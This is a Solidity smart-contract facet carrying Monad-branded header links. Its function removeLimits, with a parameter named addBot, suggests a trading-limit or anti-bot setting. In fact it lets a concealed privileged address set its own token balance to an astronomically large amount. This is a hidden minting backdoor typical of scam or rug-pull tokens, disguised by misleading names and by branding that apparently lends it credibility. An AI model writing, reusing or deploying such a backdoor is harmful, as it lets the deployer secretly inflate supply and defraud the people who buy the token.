// SPDX-License-Identifier: UNLICENSED
// Website: https://www.monad.xyz
// Twitter: https://twitter.com/monad_xyz
// Discord: https://discord.com/invite/monad
// Telegram: https://t.me/monad_xyz

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
